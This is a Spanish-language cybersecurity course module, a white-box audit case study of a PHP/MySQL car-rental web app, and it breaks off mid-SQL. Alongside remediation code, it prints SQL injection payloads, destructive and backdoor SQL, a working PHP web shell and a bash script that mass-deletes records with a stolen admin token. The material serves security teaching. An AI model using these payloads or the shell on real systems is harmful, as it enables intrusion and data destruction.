# 🎓 Curso de Ciberseguridad — Módulo: White Hacking Aplicado

## Caso de Estudio Real: Auditoría de Seguridad en Aplicación Web de Producción

> **Tipo:** Material Educativo — Laboratorio Guiado  
> **Nivel:** Intermedio-Avanzado  
> **Prerrequisitos:** Fundamentos de redes, HTTP, SQL, y programación web  
> **Duración estimada:** 8-12 horas de estudio + prácticas  
> **Stack del sistema auditado:** Angular 19 (Frontend) + PHP 8.x (Backend API) + MySQL (Base de Datos)  
> **Fecha de creación:** Abril 2026

---

## 📋 Tabla de Contenidos

1. [Marco Ético y Legal](#1-marco-ético-y-legal)
2. [Metodología de Pentesting Utilizada](#2-metodología-de-pentesting-utilizada)
3. [Reconocimiento y Análisis del Objetivo](#3-reconocimiento-y-análisis-del-objetivo)
4. [Módulo A — SQL Injection: De la Teoría a la Práctica Real](#4-módulo-a--sql-injection)
5. [Módulo B — Exposición de Credenciales en Código Fuente](#5-módulo-b--exposición-de-credenciales)
6. [Módulo C — Endpoints de Administración como Superficie de Ataque](#6-módulo-c--endpoints-de-administración)
7. [Módulo D — Destrucción Lógica: Borrado Masivo via API](#7-módulo-d--destrucción-lógica)
8. [Módulo E — Escalamiento de Privilegios: De Usuario a Administrador](#8-módulo-e--escalamiento-de-privilegios)
9. [Módulo F — Ataques al Lado del Cliente: XSS y Robo de Tokens](#9-módulo-f--xss-y-robo-de-tokens)
10. [Módulo G — Debilidades en Gestión de Sesiones y Reset de Contraseñas](#10-módulo-g--sesiones-y-reset)
11. [Módulo H — Plan de Remediación y Hardening](#11-módulo-h--plan-de-remediación)
12. [Laboratorios Prácticos](#12-laboratorios-prácticos)
13. [Evaluación Final](#13-evaluación-final)
14. [Recursos Adicionales](#14-recursos-adicionales)

---

# 1. Marco Ético y Legal

> ⚠️ **ADVERTENCIA LEGAL**  
> **Las técnicas documentadas en este material son EXCLUSIVAMENTE para fines educativos y de auditoría autorizada.** El uso no autorizado de estas técnicas contra sistemas de terceros constituye un delito en la mayoría de jurisdicciones (en Colombia: Ley 1273 de 2009 — Delitos Informáticos). Todo pentesting DEBE contar con autorización escrita del propietario del sistema.

### 1.1 ¿Qué es el White Hacking?

El **White Hacking** (hacking ético) es la práctica autorizada de probar la seguridad de sistemas informáticos utilizando las mismas técnicas que emplearía un atacante malicioso, pero con el objetivo de **identificar y remediar vulnerabilidades** antes de que sean explotadas.

### 1.2 Principios Fundamentales del Hacker Ético

| Principio | Descripción |
|-----------|-------------|
| **Autorización** | Siempre contar con permiso escrito (contrato, NDA, scope definido) |
| **Alcance** | Nunca exceder los límites del alcance acordado |
| **Reporte** | Documentar y reportar TODAS las vulnerabilidades encontradas |
| **No dañar** | No destruir datos, no interrumpir servicios, no exfiltrar información real |
| **Confidencialidad** | Toda información descubierta es confidencial |

### 1.3 Diferencias Clave

```
┌─────────────────┬────────────────────────┬────────────────────────┐
│   Categoría      │    White Hat           │     Black Hat          │
├─────────────────┼────────────────────────┼────────────────────────┤
│ Autorización    │ ✅ Con permiso escrito  │ ❌ Sin autorización    │
│ Objetivo        │ Mejorar seguridad      │ Beneficio personal     │
│ Reporte         │ Al cliente/propietario │ Se vende o se explota  │
│ Legalidad       │ Legal                  │ Ilegal                 │
│ Daño al sistema │ Minimizado/ninguno     │ Daño intencional       │
└─────────────────┴────────────────────────┴────────────────────────┘
```

### 1.4 Contexto del Caso de Estudio

En este módulo analizaremos una **auditoría de seguridad real** realizada sobre una aplicación web de alquiler de vehículos. El auditor (instructor de este curso) fue contratado como desarrollador del sistema y realizó una auditoría de caja blanca (con acceso al código fuente) para identificar vulnerabilidades críticas.

> **NOTA:** Todas las credenciales, URLs y datos identificables han sido **redactados** de este material. Los ejemplos utilizan valores ficticios con fines didácticos.

---

# 2. Metodología de Pentesting Utilizada

### 2.1 Frameworks de Referencia

Esta auditoría siguió principios de:

- **OWASP Testing Guide v4.2** — Metodología de pruebas de seguridad web
- **PTES (Penetration Testing Execution Standard)** — Para la estructura general
- **OWASP Top 10 (2021)** — Para clasificación de vulnerabilidades

### 2.2 Tipo de Auditoría: Caja Blanca (White Box)

```
┌──────────────────────────────────────────────────────────────────┐
│                  TIPOS DE AUDITORÍA EN PENTESTING                │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │  CAJA NEGRA  │  │  CAJA GRIS   │  │  CAJA BLANCA │ ◄── ESTA │
│  │  (Black Box) │  │  (Gray Box)  │  │  (White Box) │           │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤           │
│  │ Sin acceso   │  │ Acceso       │  │ Acceso total │           │
│  │ al código    │  │ parcial      │  │ al código    │           │
│  │ fuente       │  │ (credencials │  │ fuente, BD,  │           │
│  │              │  │  de usuario) │  │ infra        │           │
│  │ Simula un    │  │ Simula un    │  │ Auditoría    │           │
│  │ atacante     │  │ insider con  │  │ exhaustiva   │           │
│  │ externo      │  │ privilegios  │  │ de seguridad │           │
│  │              │  │ limitados    │  │              │           │
│  └──────────────┘  └──────────────┘  └──────────────┘           │
└──────────────────────────────────────────────────────────────────┘
```

### 2.3 Fases de la Auditoría Realizada

```
Fase 1: Reconocimiento
  └─► Análisis del código fuente (PHP, Angular, SQL)
  └─► Mapeo de endpoints de la API REST
  └─► Identificación de mecanismos de autenticación
  └─► Inventario de dependencias y CDNs externos

Fase 2: Identificación de Vulnerabilidades
  └─► Análisis estático (SAST) del código PHP
  └─► Revisión de configuraciones de seguridad
  └─► Mapeo de superficie de ataque (endpoints, inputs, archivos)

Fase 3: Evaluación de Explotabilidad
  └─► Para cada vulnerabilidad: ¿es explotable en el contexto real?
  └─► Análisis de barreras de mitigación existentes
  └─► Clasificación de severidad (Crítico/Alto/Medio/Bajo)

Fase 4: Documentación y Remediación
  └─► Informe técnico con evidencias
  └─► Parches propuestos con código específico
  └─► Priorización de remediación
```

---

# 3. Reconocimiento y Análisis del Objetivo

### 3.1 Arquitectura del Sistema Auditado

```
┌───────────────────────────────────────────────────────────────────┐
│                      ARQUITECTURA DEL SISTEMA                     │
│                                                                   │
│   CLIENTE (Navegador)          SERVIDOR WEB           BASE DATOS  │
│  ┌──────────────────┐     ┌──────────────────┐    ┌───────────┐  │
│  │  Angular 19 SPA  │────▶│   PHP 8.x API    │───▶│  MySQL    │  │
│  │                  │ HTTP│                  │ PDO│           │  │
│  │  • Componentes   │ REST│  • index.php     │    │  • users  │  │
│  │  • Servicios     │◀────│    (Router)      │◀───│  • books  │  │
│  │  • localStorage  │     │  • Booking.php   │    │  • vehic  │  │
│  │    (tokens)      │     │  • User.php      │    │  • categ  │  │
│  │                  │     │  • Auth.php       │    │           │  │
│  │                  │     │  • config.php     │    │           │  │
│  └──────────────────┘     │  • Database.php  │    └───────────┘  │
│                           │  • Mailer.php    │                   │
│                           └──────────────────┘                   │
│                                                                   │
│   Hosting: Shared Hosting (panel de administración web)           │
└───────────────────────────────────────────────────────────────────┘
```

### 3.2 Mapeo de la Superficie de Ataque

El primer paso en cualquier auditoría es **mapear la superficie de ataque** — todos los puntos donde un atacante puede interactuar con el sistema:

```
SUPERFICIE DE ATAQUE IDENTIFICADA:
═══════════════════════════════════

📡 Endpoints Públicos (sin autenticación):
   POST /auth/register          → Crear cuenta
   POST /auth/login             → Iniciar sesión
   POST /auth/forgot-password   → Solicitar reset
   POST /auth/reset-password    → Cambiar con token
   GET  /vehicles               → Listar vehículos
   GET  /bookings/{code}        → Consultar reserva
   POST /bookings               → Crear reserva
   POST /marketing/subscribe    → Suscribirse a newsletter
   POST /contact                → Formulario de contacto

🔒 Endpoints Protegidos (requieren token admin):
   GET    /admin/users               → Listar usuarios
   POST   /admin/users               → Crear admin
   PUT    /admin/users/{id}/role      → Cambiar rol
   DELETE /admin/users/{id}           → Eliminar usuario
   GET    /admin/bookings             → Listar reservas
   DELETE /admin/bookings/{id}        → Eliminar reserva
   POST   /admin/instances/{id}/maint → Crear mantenimiento
   DELETE /admin/instances/{id}       → Eliminar vehículo
   POST   /admin/system/setup-schema  → Modificar esquema BD

📁 Archivos Accesibles por HTTP:
   /server/public/index.php     → Router principal
   /server/public/debug_log.txt → ⚠️ Log de depuración
   /.git/                       → ⚠️ Repositorio Git (posible)

🔑 Almacenamiento del Cliente:
   localStorage['token']        → Token de sesión
   localStorage['user']         → Datos del usuario (incluye rol)
```

> 💡 **Ejercicio para el estudiante:** Antes de continuar, clasifica cada endpoint según el nivel de riesgo que representa. Pregúntate: ¿Qué pasa si un atacante envía datos maliciosos a cada uno? ¿Qué información puede obtener?

---

# 4. Módulo A — SQL Injection: De la Teoría a la Práctica Real

## 4.1 Concepto Teórico

**SQL Injection** (Inyección SQL) es una vulnerabilidad que ocurre cuando datos proporcionados por el usuario se insertan directamente en una consulta SQL sin ser tratados como datos, permitiendo al atacante **modificar la lógica de la consulta**.

### Clasificación OWASP
- **OWASP Top 10 — A03:2021 Injection**
- **CWE-89: SQL Injection**
- **CVSS Base Score típico: 8.6 - 10.0 (Crítico)**

## 4.2 Anatomía de una SQL Injection

```sql
-- CÓDIGO VULNERABLE (ejemplo didáctico):
-- El desarrollador construye la consulta concatenando la variable directamente
$query = "SELECT * FROM productos WHERE id = " . $userInput;

-- Si el usuario envía: 1
-- Query resultante: SELECT * FROM productos WHERE id = 1
-- ✅ Comportamiento esperado

-- Si el atacante envía: 1; DROP TABLE productos; --
-- Query resultante: SELECT * FROM productos WHERE id = 1; DROP TABLE productos; --
-- ❌ ¡Se ejecuta un segundo comando que DESTRUYE la tabla!
```

## 4.3 Caso Real Encontrado: Interpolación Directa de Variable

En la auditoría se encontró el siguiente código **real** en el servidor PHP:

```php
// ─── CÓDIGO VULNERABLE ENCONTRADO ─────────────────────────────────────
// Archivo: Booking.php — Función createMaintenance()
// La variable $vehicleId se INTERPOLA directamente en la cadena SQL
// en lugar de usar un parámetro preparado (:placeholder)

public function createMaintenance($adminUserId, $vehicleId, $startDate, $endDate, $notes = '')
{
    try {
        $this->conn->beginTransaction();

        //  ⚠️ VULNERABILIDAD: $vehicleId interpolado directamente
        //  ↓↓↓ Observa que NO usa :placeholder ni prepare()
        $catId = $this->conn->query(
            "SELECT category_id FROM vehicles WHERE id = $vehicleId"
        )->fetchColumn();

        // ... resto de la función
    }
}
```

### ¿Dónde se origina el valor de `$vehicleId`?

Para evaluar si una vulnerabilidad es explotable, debemos rastrear **de dónde viene el dato** (análisis de flujo de datos o *taint analysis*):

```php
// ─── RASTREO DEL FLUJO DE DATOS ───────────────────────────────────────
// Archivo: index.php — Router del backend

// El endpoint que llama a la función vulnerable:
if ($method === 'POST' && preg_match('#^/admin/instances/(\d+)/maintenance$#', $requestUri, $matches)) {
    $admin = requireAdmin();          // ← BARRERA 1: Solo admins
    $input = getJsonInput();
    $id = $bookingModel->createMaintenance(
        $admin['id'],
        $matches[1],                  // ← $vehicleId viene del regex
        $input['start_date'],
        $input['end_date'],
        $input['notes'] ?? ''
    );
}
```

## 4.4 Análisis de Barreras de Protección (Defensa en Profundidad)

> **CONCEPTO CLAVE:** La **Defensa en Profundidad** consiste en implementar múltiples capas de seguridad, de modo que si una falla, las demás sigan protegiendo el sistema.

En este caso, existen **3 barreras** que previenen la explotación:

```
┌──────────────────────────────────────────────────────────────────────┐
│               ANÁLISIS DE BARRERAS DE PROTECCIÓN                     │
│                                                                      │
│  BARRERA 1: Autenticación                                            │
│  ┌──────────────────────────────────────────────────────┐            │
│  │ requireAdmin() → verifica token Bearer con role=admin │            │
│  │ RESULTADO: Un usuario anónimo o normal NO puede      │            │
│  │            llegar a este código                       │            │
│  │ FORTALEZA: ████████░░ (8/10)                          │            │
│  │ DEBILIDAD: Si el token admin es robado, esta barrera  │            │
│  │            se vuelve inútil                           │            │
│  └──────────────────────────────────────────────────────┘            │
│                                                                      │
│  BARRERA 2: Validación de Input por Regex                            │
│  ┌──────────────────────────────────────────────────────┐            │
│  │ Regex: (\d+) → solo acepta dígitos [0-9]+            │            │
│  │ RESULTADO: "1; DROP TABLE x;--" NO pasa el filtro    │            │
│  │ FORTALEZA: ████████░░ (8/10)                          │            │
│  │ DEBILIDAD: Si un desarrollador futuro cambia (\d+)   │            │
│  │            por ([^/]+), esta barrera se pierde        │            │
│  └──────────────────────────────────────────────────────┘            │
│                                                                      │
│  BARRERA 3: Configuración de PDO                                     │
│  ┌──────────────────────────────────────────────────────┐            │
│  │ PDO::ATTR_EMULATE_PREPARES => false                  │            │
│  │ RESULTADO: MySQL nativo rechaza multi-statements     │            │
│  │            en una sola llamada query()                │            │
│  │ FORTALEZA: ████████░░ (8/10)                          │            │
│  │ DEBILIDAD: Si alguien cambia esta config, se habilitan│            │
│  │            los multi-statements                       │            │
│  └──────────────────────────────────────────────────────┘            │
│                                                                      │
│  ═══ VEREDICTO: NO EXPLOTABLE en su estado actual ═══                │
│  ═══ PERO: Es una violación del principio de defensa ═══            │
│  ═══        en profundidad que DEBE corregirse       ═══            │
└──────────────────────────────────────────────────────────────────────┘
```

## 4.5 ¿Qué pasaría SI las barreras fallaran?

Como ejercicio educativo, simulamos qué payloads serían efectivos si se removieran las protecciones:

```bash
# ─── ESCENARIO HIPOTÉTICO: Sin regex (\d+) y con multi-statement ───

# PAYLOAD 1 — Destrucción de tabla
# La URL inyecta SQL después del ID del vehículo:
POST /admin/instances/1;DROP TABLE bookings;--/maintenance

# SQL que se ejecutaría internamente:
# SELECT category_id FROM vehicles WHERE id = 1;DROP TABLE bookings;--
#                                             └──────────────────────┘
#                                          El segundo comando destruye la tabla
```

```bash
# PAYLOAD 2 — Escalamiento de privilegios masivo
POST /admin/instances/1;UPDATE users SET role='admin';--/maintenance

# SQL resultante:
# SELECT category_id FROM vehicles WHERE id = 1;UPDATE users SET role='admin';--
# Todos los usuarios se vuelven admin
```

```bash
# PAYLOAD 3 — Extracción de datos sensibles (UNION-based injection)
POST /admin/instances/0 UNION SELECT GROUP_CONCAT(email,':',password_hash) FROM users--/maintenance

# SQL resultante:
# SELECT category_id FROM vehicles WHERE id = 0
# UNION SELECT GROUP_CONCAT(email,':',password_hash) FROM users--
# Retorna todos los emails y hashes de contraseñas
```

## 4.6 Corrección: Código Seguro

```php
// ─── ANTES (Vulnerable) ──────────────────────────────────────────────
$catId = $this->conn->query(
    "SELECT category_id FROM vehicles WHERE id = $vehicleId"
)->fetchColumn();

// ─── DESPUÉS (Seguro — Prepared Statement) ───────────────────────────
$stmt = $this->conn->prepare("SELECT category_id FROM vehicles WHERE id = :vid");
$stmt->execute([':vid' => $vehicleId]);
$catId = $stmt->fetchColumn();
```

### ¿Por qué es seguro el prepared statement?

```
┌──────────────────────────────────────────────────────────────────┐
│ PREPARED STATEMENT: Separación de Código y Datos                 │
│                                                                  │
│ Paso 1: Se envía la ESTRUCTURA de la consulta al motor SQL       │
│         "SELECT category_id FROM vehicles WHERE id = ?"          │
│         MySQL compila el plan de ejecución                       │
│                                                                  │
│ Paso 2: Se envían los DATOS por separado                         │
│         Valor: "1; DROP TABLE bookings;--"                       │
│         MySQL lo trata SOLAMENTE como un valor literal            │
│         No intenta interpretar ; DROP TABLE como SQL              │
│                                                                  │
│ RESULTADO: Es IMPOSIBLE que los datos alteren la consulta        │
└──────────────────────────────────────────────────────────────────┘
```

> 💡 **Regla de oro:** NUNCA concatenes o interpoles variables del usuario directamente en cadenas SQL. Siempre usa prepared statements con parámetros (`?` o `:nombre`).

---

# 5. Módulo B — Exposición de Credenciales en Código Fuente

## 5.1 Concepto Teórico

- **OWASP Top 10 — A07:2021 Identification and Authentication Failures**
- **CWE-798: Use of Hard-coded Credentials**
- **CWE-312: Cleartext Storage of Sensitive Information**

La exposición de credenciales en el código fuente es una de las vulnerabilidades más comunes y más devastadoras. Ocurre cuando datos sensibles (contraseñas, API keys, tokens) se almacenan directamente en archivos de código que terminan en repositorios de control de versiones.

## 5.2 Caso Real Encontrado

```php
// ─── CÓDIGO ENCONTRADO EN AUDITORÍA ──────────────────────────────────
// Archivo: config.php
// ⚠️ Credenciales redactadas — los valores reales han sido omitidos

return [
    'host'     => 'localhost',
    'dbname'   => '████████_ocean_db',          // Nombre de BD redactado
    'user'     => '████████_admin',              // Usuario redactado
    'password' => '████████████████',            // ⚠️ CONTRASEÑA EN TEXTO PLANO
];
```

## 5.3 ¿Por qué es esto CRÍTICO?

La contraseña de la base de datos en texto plano en el código fuente abre una **cadena de ataque completa**:

```
┌──────────────────────────────────────────────────────────────────┐
│           CADENA DE ATAQUE POR CREDENCIALES EXPUESTAS            │
│                                                                  │
│   ┌───────────────────┐                                          │
│   │ 1. RECOLECCIÓN    │  El atacante obtiene el código fuente    │
│   │    DE CREDENCIALES│  de alguna de estas fuentes:             │
│   │                   │  • Repositorio público en GitHub         │
│   │                   │  • Backup accesible en el servidor       │
│   │                   │  • Directorio .git/ expuesto en web      │
│   │                   │  • Ingeniería social a un colaborador    │
│   └────────┬──────────┘                                          │
│            │                                                     │
│            ▼                                                     │
│   ┌───────────────────┐                                          │
│   │ 2. RECONOCIMIENTO │  Con el prefijo del usuario de BD,       │
│   │    DEL HOSTING    │  el atacante identifica el proveedor:    │
│   │                   │  • Resolución DNS del dominio            │
│   │                   │  • Escaneo de puertos (nmap)             │
│   └────────┬──────────┘                                          │
│            │                                                     │
│            ▼                                                     │
│   ┌───────────────────┐                                          │
│   │ 3. ACCESO AL      │  Vectores para llegar a MySQL:           │
│   │    SERVIDOR       │  • Panel de administración del hosting   │
│   │                   │  • phpMyAdmin (si está habilitado)       │
│   │                   │  • SSH (si está habilitado)              │
│   │                   │  • Reutilización de contraseña           │
│   └────────┬──────────┘                                          │
│            │                                                     │
│            ▼                                                     │
│   ┌───────────────────┐                                          │
│   │ 4. CONTROL TOTAL  │  IMPACTO:                                │
│   │    DE LA BASE     │  • Leer toda la información              │
│   │    DE DATOS       │  • Modificar/eliminar registros          │
│   │                   │  • Crear cuentas de administrador        │
│   │                   │  • Destruir la BD completa               │
│   │                   │  • Plantar backdoors persistentes        │
│   └───────────────────┘                                          │
└──────────────────────────────────────────────────────────────────┘
```

## 5.4 Técnicas de Recolección de Credenciales (OSINT + Herramientas)

```bash
# ─── HERRAMIENTAS QUE DETECTAN SECRETOS EN CÓDIGO ─────────────────────

# 1. TruffleHog — Busca secretos en historial Git
trufflehog git https://github.com/usuario/repositorio.git

# 2. GitLeaks — Escaneo rápido de repositorios
gitleaks detect --source . --verbose

# 3. Búsqueda manual con grep
grep -rn "password" --include="*.php" --include="*.env" --include="*.json" .
grep -rn "api_key\|secret\|token" --include="*.php" .

# 4. GitHub Secret Scanning (automático en repos públicos)
# GitHub envía alertas si detecta patrones de API keys conocidos
```

## 5.5 Escenarios de Explotación Paso a Paso

### Escenario A: El atacante accede via el panel del hosting

```
PASO 1: Identificar el proveedor de hosting (via prefijo de usuario de BD,
        registros DNS, o fingerprinting del servidor)

PASO 2: Acceder al panel de administración del hosting
        • Probar la misma contraseña de la BD (reutilización de contraseñas)
        • Probar variaciones comunes de la contraseña encontrada

PASO 3: Navegare a la sección de Bases de Datos → phpMyAdmin

PASO 4: Ejecutar consultas SQL destructivas:
```

```sql
-- PAYLOAD DE DESTRUCCIÓN TOTAL:
DROP TABLE IF EXISTS bookings;
DROP TABLE IF EXISTS vehicles;
DROP TABLE IF EXISTS categories;
DROP TABLE IF EXISTS users;
-- El negocio queda completamente inoperativo.
-- Todas las reservas, clientes, vehículos, historial → ELIMINADOS
```

```sql
-- PAYLOAD SILENCIOSO (más peligroso porque no se detecta inmediatamente):
-- En vez de borrar, modificar datos sutilmente:

-- 1. Reducir todos los precios un 90%
UPDATE categories SET base_price = base_price * 0.1;

-- 2. Cambiar emails de contacto para recibir las notificaciones
UPDATE users SET email = 'atacante@correo-anonimo.com' WHERE role = 'admin';

-- 3. Insertar backdoor: crear usuario admin oculto
INSERT INTO users (name, email, password_hash, role) VALUES (
    'System',
    'system@dominio-falso.com',
    '$2y$10$...(hash de contraseña conocida por el atacante)...',
    'admin'
);

-- 4. Modificar reservas futuras para generar conflictos operativos
UPDATE bookings SET vehicle_id = 1 WHERE status = 'confirmed';
-- Todos los clientes llegan el mismo día por el mismo auto
```

### Escenario B: El atacante sube un web shell via el hosting

```php
// El atacante crea un archivo PHP que sirve como terminal remota:
// Esto demuestra por qué el acceso al panel de hosting es DEVASTADOR

<?php
// Web Shell — ejecuta cualquier comando del SO o consulta SQL
if (isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}

if (isset($_GET['sql'])) {
    $config = require __DIR__ . '/server/src/config.php';
    $pdo = new PDO(
        "mysql:host={$config['host']};dbname={$config['dbname']}",
        $config['user'],
        $config['password']
    );
    $result = $pdo->query($_GET['sql'])->fetchAll(PDO::FETCH_ASSOC);
    echo '<pre>' . json_encode($result, JSON_PRETTY_PRINT) . '</pre>';
}
?>
```

```bash
# Uso del web shell (simulado):
curl "https://ejemplo.com/shell.php?sql=SELECT+*+FROM+users"
curl "https://ejemplo.com/shell.php?cmd=ls+-la+/home/"
# ↑ Control TOTAL del servidor y la base de datos
```

## 5.6 Corrección: Gestión Segura de Credenciales

```
┌──────────────────────────────────────────────────────────────────┐
│              CORRECCIÓN: Archivo .env                             │
│                                                                  │
│  1. Crear archivo .env (FUERA del directorio público web):       │
│                                                                  │
│     DB_HOST=localhost                                             │
│     DB_NAME=nombre_base_datos                                    │
│     DB_USER=usuario_db                                           │
│     DB_PASS=ContraseñaSegura!2026                                │
│                                                                  │
│  2. Agregar .env a .gitignore:                                   │
│     echo ".env" >> .gitignore                                    │
│                                                                  │
│  3. Leer en config.php:                                          │
│     return [                                                     │
│         'host'     => getenv('DB_HOST'),                         │
│         'dbname'   => getenv('DB_NAME'),                         │
│         'user'     => getenv('DB_USER'),                         │
│         'password' => getenv('DB_PASS'),                         │
│     ];                                                           │
│                                                                  │
│  4. Si ya fue committeado, LIMPIAR historial Git:                │
│     git filter-branch o BFG Repo-Cleaner                         │
│                                                                  │
│  5. ROTAR la contraseña inmediatamente (la anterior              │
│     está comprometida permanentemente en el historial)           │
└──────────────────────────────────────────────────────────────────┘
```

> ⚠️ **IMPORTANTE:** No es suficiente borrar el archivo. Si las credenciales alguna vez fueron committeadas en Git, existen en el historial para siempre. Debes usar herramientas como `git filter-branch` o `BFG Repo-Cleaner` para purgar el historial, y **rotar la contraseña** inmediatamente.

---

# 6. Módulo C — Endpoints de Administración como Superficie de Ataque

## 6.1 Concepto: Endpoints de DDL via HTTP

**DDL (Data Definition Language)** son comandos SQL que modifican la estructura de la base de datos (`CREATE TABLE`, `ALTER TABLE`, `DROP TABLE`). **Nunca deberían ser accesibles via HTTP en producción.**

## 6.2 Caso Real Encontrado: Endpoint `setup-schema`

```php
// ─── ENDPOINT ENCONTRADO EN AUDITORÍA ─────────────────────────────────
// Un endpoint HTTP que ejecuta ALTER TABLE y CREATE TABLE directamente

if ($method === 'POST' && $requestUri === '/admin/system/setup-schema') {
    requireAdmin();    // Solo admins, pero...
    $db = new Database();
    $conn = $db->getConnection();

    // Ejecuta DDL directamente — modifica la ESTRUCTURA de la BD:
    $conn->exec("ALTER TABLE vehicles ADD COLUMN wash_price DECIMAL(10,2) DEFAULT 0.00");
    $conn->exec("ALTER TABLE categories ADD COLUMN luggage INT DEFAULT 2");
    $conn->exec("CREATE TABLE IF NOT EXISTS marketing_subscribers (...)");
    $conn->exec("CREATE TABLE IF NOT EXISTS contact_requests (...)");
}
```

## 6.3 Análisis de Riesgo

```
┌──────────────────────────────────────────────────────────────────┐
│    ¿POR QUÉ ES PELIGROSO UN ENDPOINT DE DDL VIA HTTP?           │
│                                                                  │
│  1. Superficie de ataque innecesaria                             │
│     • Cualquiera con token admin puede modificar la estructura   │
│       de la BD con un simple POST HTTP                           │
│                                                                  │
│  2. Sin segundo factor de autenticación                          │
│     • No requiere re-ingreso de contraseña                       │
│     • No requiere OTP/2FA                                        │
│                                                                  │
│  3. Sin auditoría                                                │
│     • No se registra quién ejecutó el cambio                     │
│     • No se puede revertir fácilmente                            │
│                                                                  │
│  4. Riesgo de expansión                                          │
│     • Si un desarrollador agrega input dinámico en el futuro     │
│       (nombre de tabla, columna), se convierte en DDL Injection  │
│                                                                  │
│  ═══ PRINCIPIO: Las migraciones de BD JAMÁS deben exponerse     ═══
│  ═══ como endpoints HTTP. Deben ejecutarse con scripts           ═══
│  ═══ manuales o herramientas de migración en el servidor.        ═══
└──────────────────────────────────────────────────────────────────┘
```

## 6.4 Buena Práctica: Migraciones Seguras

```bash
# ─── ALTERNATIVAS SEGURAS PARA MIGRACIÓN DE ESQUEMA ────────────────────

# Opción 1: Scripts CLI ejecutados manualmente en el servidor
php migrate.php --up

# Opción 2: Herramientas de migración (Laravel Migrations, Flyway, etc.)
php artisan migrate

# Opción 3: Migraciones via CI/CD con aprobación humana
# Pipeline: commit → review → aprobación → deploy con migración automática

# NUNCA: Endpoints HTTP accesibles externamente para DDL
```

---

# 7. Módulo D — Destrucción Lógica: Borrado Masivo via API

## 7.1 Concepto: Insufficient Anti-Automation

- **OWASP — Insufficient Anti-Automation**
- **CWE-770: Allocation of Resources Without Limits or Throttling**

Cuando una API permite operaciones destructivas (DELETE) sin **rate limiting**, **confirmación adicional**, ni **registro de auditoría**, un atacante con credenciales válidas puede automatizar la destrucción del sistema.

## 7.2 Caso Real: Endpoints DELETE sin Protección

La API auditada expone estos endpoints de borrado:

```
DELETE /admin/bookings/{id}   → Elimina una reserva (borrado permanente)
DELETE /admin/users/{id}      → Elimina un usuario (borrado permanente)
DELETE /admin/instances/{id}  → Elimina un vehículo (borrado permanente)
```

**Características peligrosas de estos endpoints:**

| Aspecto | Estado Encontrado | Estado Recomendado |
|---------|------------------|--------------------|
| Rate Limiting | ❌ Sin límite | ✅ Max 5/min |
| Confirmación | ❌ Sin segundo factor | ✅ Re-autenticación |
| Tipo de borrado | ❌ Hard delete (permanente) | ✅ Soft delete (reversible) |
| Registro de auditoría | ❌ Sin log | ✅ Quién, qué, cuándo, IP |
| Alertas | ❌ Sin alertas | ✅ Alerta si > 5 deletes/hora |
| Backups | ❌ Sin backup automático | ✅ Backup cada 6-12 horas |

## 7.3 Simulación Educativa: Script de Borrado Automatizado

> ⚠️ **ADVERTENCIA:** El siguiente script es EXCLUSIVAMENTE educativo. Muestra cómo un atacante con token admin robado podría automatizar la destrucción. **Nunca ejecutes esto contra un sistema real sin autorización.**

```bash
#!/bin/bash
# ─── SIMULACIÓN EDUCATIVA: Script de destrucción automatizada ──────────
# PROPÓSITO: Demostrar la necesidad de rate limiting y protecciones
# NOTA: Las URLs y tokens son ficticios

TOKEN="<token_admin_comprometido>"
BASE="https://ejemplo.com/api"

# ── FASE 1: Recolectar todos los IDs (reconocimiento) ──
echo "[RECON] Obteniendo inventario del sistema..."
BOOKINGS=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/admin/bookings" | \
           python3 -c "import json,sys; [print(b['id']) for b in json.load(sys.stdin)]")

USERS=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/admin/users" | \
        python3 -c "import json,sys; [print(u['id']) for u in json.load(sys.stdin)]")

# ── FASE 2: Borrar todas las reservas ──
echo "[ATAQUE] Eliminando reservas (sin rate limiting, nada lo detiene)..."
for id in $BOOKINGS; do
    curl -s -X DELETE -H "Authorization: Bearer $TOKEN" "$BASE/admin/bookings/$id"
done

# ── FASE 3: Borrar todos los usuarios ──
echo "[ATAQUE] Eliminando usuarios..."
for uid in $USERS; do
    curl -s -X DELETE -H "Authorization: Bearer $TOKEN" "$BASE/admin/users/$uid"
done

# ── RESULTADO ──
# Tiempo estimado: ~60 segundos para destruir todo el negocio
# Sin alertas, sin logs, sin posibilidad de recuperación
```

### Cálculo del Impacto

```
┌──────────────────────────────────────────────────────────────────┐
│               CÁLCULO DE TIEMPO DE DESTRUCCIÓN                   │
│                                                                  │
│  Supuestos:                                                      │
│  • 100 reservas + 50 vehículos + 30 usuarios = 180 peticiones    │
│  • Velocidad: 3 peticiones/segundo (conservador)                 │
│  • Tiempo total: 180 / 3 = 60 segundos                          │
│                                                                  │
│  ══════════════════════════════════════════════                   │
│  TODO EL NEGOCIO DESTRUIDO EN ~1 MINUTO                          │
│  Sin rate limiting · Sin alertas · Sin confirmación              │
│  ══════════════════════════════════════════════                   │
│                                                                  │
│  Con protecciones adecuadas:                                     │
│  • Rate limit 5/min → 180/5 = 36 minutos (tiempo de reacción)   │
│  • Alerta a los 5 borrados → admin notificado en minuto 1        │
│  • Soft delete → todo recuperable después del ataque             │
└──────────────────────────────────────────────────────────────────┘
```

## 7.4 Correcciones de Seguridad

### a) Soft Delete (Borrado Lógico)

```php
// ─── ANTES: Hard Delete (irrecuperable) ───────────────────────────────
$stmt = $conn->prepare("DELETE FROM bookings WHERE id = :id");

// ─── DESPUÉS: Soft Delete (recuperable) ──────────────────────────────
// 1. Agregar columna: ALTER TABLE bookings ADD COLUMN deleted_at DATETIME NULL;
// 2. En lugar de DELETE, marcar como eliminado:
$stmt = $conn->prepare("UPDATE bookings SET deleted_at = NOW() WHERE id = :id");
// 3. Filtrar en todas las consultas:
$stmt = $conn->prepare("SELECT * FROM bookings WHERE deleted_at IS NULL");
```

### b) Rate Limiting

```php
// ─── Implementación básica de rate limiting ───────────────────────────
function checkRateLimit($action, $userId, $maxPerMinute = 5) {
    $key = "ratelimit:{$action}:{$userId}";
    $count = getFromCache($key) ?? 0;  // Redis, Memcached, o tabla en BD

    if ($count >= $maxPerMinute) {
        http_response_code(429);
        die(json_encode(['error' => 'Demasiadas solicitudes. Intente más tarde.']));
    }

    incrementInCache($key, expireSeconds: 60);
}
```

### c) Audit Log (Registro de Auditoría)

```sql
-- ─── Tabla de auditoría ───────────────────────────────────────────────
CREATE TABLE audit_log (
